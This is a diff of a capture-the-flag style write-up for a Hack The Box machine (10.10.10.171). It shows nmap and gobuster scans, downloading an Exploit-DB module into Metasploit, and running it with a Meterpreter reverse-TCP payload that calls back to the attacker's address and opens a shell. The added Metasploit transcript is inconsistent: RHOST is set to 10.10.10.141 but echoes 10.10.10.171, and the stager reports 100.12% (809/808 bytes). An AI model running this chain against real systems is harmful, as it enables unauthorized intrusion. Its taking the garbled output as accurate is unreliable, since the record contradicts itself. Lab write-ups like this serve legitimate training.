@@ -45,7 +45,7 @@ The attacker will need the following software to exploit this box.
 
 Target: `10.10.10.171`
 
-```
+```bash
 root@kali:~$ sudo nmap -sS 10.10.10.171
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 20:09 EST
 Nmap scan report for 10.10.10.171
@@ -65,7 +65,7 @@ Lets view what we can see on TCP Port 80:
 
 Now that we know there is a web server running on TCP port 80 lets perform a DirBuster:
 
-```
+```bash
 root@kali:~/HTB/red-team$ sudo gobuster dir -u http://10.10.10.171 -w ~/HTB/red-team/wordlists/directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.0.1
@@ -149,15 +149,15 @@ msf5 >
 
 It appears at the time of writing this report, this exploit is not in Metasploit's database by default. We can try updating the database but more than likely it will not pull the latest copy of this exploit. Let's manually add this exploit to our Metasploit instance by using the following code:
 
-```
+```bash
 root@kali:~# wget https://www.exploit-db.com/raw/47772
 --2020-01-21 15:11:24--  https://www.exploit-db.com/raw/47772
 Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
-Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
+Connecting to www.exploit-db.com (www.exploit-db.com:443)... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 3017 (2.9K) [text/plain]
 Saving to: ‘47772’  
-47772                         100%[=================================================>]   2.95K  --.-KB/s    in 0s
+47772 100%[=================================================>] 2.95K
 2020-01-21 15:11:24 (20.4 MB/s) - ‘47772’ saved [3017/3017]
 root@kali:~# mkdir -p ~/.msf4/modules/exploits/custom
 root@kali:~# mv 47772 ~/.msf4/modules/exploits/custom/ona.rb
@@ -165,8 +165,30 @@ root@kali:~# mv 47772 ~/.msf4/modules/exploits/custom/ona.rb
 
 # Exploiting
 
-I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured.
-Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.
+Now that we have the Metasploit exploit within our database lets attempt to run this exploit:
+
+```
+msf5 > use exploit/custom/ona
+msf5 exploit(custom/ona) > set RHOST 10.10.10.141
+RHOST => 10.10.10.171
+msf5 exploit(custom/ona) > set TARGETURL /ona/
+TARGETURL => /ona/
+msf5 exploit(custom/ona) > set LHOST 10.10.10.10 #set to your VPN Address
+LHOST => 10.10.10.10
+msf5 exploit(custom/ona) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+PAYLOAD => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(custom/ona) > exploit
+
+[*] Started reverse TCP handler on 10.10.10.10:4444
+[*] Exploiting...
+[*] Sending stage (3021284 bytes) to 10.10.10.171
+[*] Meterpreter session 1 opened at 2020-01-21 15:52:49 +0100
+[*] Command Stager progress - 100.12% done (809/808 bytes)
+
+meterpreter >
+```
+
+Success! We have a Meterpreter session!
 
 ## Place-Holder
 
